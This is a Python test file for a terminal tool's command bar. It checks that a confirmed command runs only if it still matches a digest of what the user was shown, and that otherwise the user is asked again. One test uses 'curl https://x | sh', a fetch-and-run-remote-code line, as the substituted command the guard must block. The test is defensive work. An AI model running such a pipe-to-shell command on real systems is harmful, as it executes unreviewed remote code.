"""A chip that asks first runs the command the person confirmed, not one resolved again afterwards.

The menu showed the command resolved when it opened; Yes ran `chip --yes`, which resolved it again from the update state.
If that file changed in between, a command nobody saw would run (pre-publish sweep, 1.14.22). Yes now carries a digest of
what was shown, and a different command at run time asks again.
"""

from __future__ import annotations

from empirica.core.cockpit import bar


def _wire(monkeypatch, commands):
    calls = {"window": [], "confirm": []}
    monkeypatch.setattr(bar, "_config_of", lambda session: None)
    monkeypatch.setattr(bar, "machine_command", lambda key, config: commands.pop(0))
    monkeypatch.setattr(bar, "_window", lambda session, name, command: calls["window"].append(command))
    monkeypatch.setattr(
        bar, "_confirm", lambda client, key, session, pane, what, expect=None: calls["confirm"].append((what, expect))
    )
    monkeypatch.setattr(bar, "_say", lambda *a, **k: None)
    return calls


def test_the_confirmed_command_runs(monkeypatch):
    calls = _wire(monkeypatch, ["claude update", "claude update"])
    bar._machine_action("C", "s", None, None, confirmed=False)
    shown, digest = calls["confirm"][0]

    bar._machine_action("C", "s", None, None, confirmed=True, expect=digest)

    assert shown == "claude update" and calls["window"] == ["claude update"]


def test_a_command_that_changed_since_it_was_confirmed_is_asked_again(monkeypatch):
    calls = _wire(monkeypatch, ["claude update", "curl https://x | sh"])
    bar._machine_action("C", "s", None, None, confirmed=False)
    _, digest = calls["confirm"][0]

    bar._machine_action("C", "s", None, None, confirmed=True, expect=digest)

    assert calls["window"] == []
    assert calls["confirm"][-1][0] == "curl https://x | sh"


def test_a_yes_without_a_digest_asks_again(monkeypatch):
    calls = _wire(monkeypatch, ["claude update"])

    bar._machine_action("C", "s", None, None, confirmed=True)

    assert calls["window"] == [] and calls["confirm"]
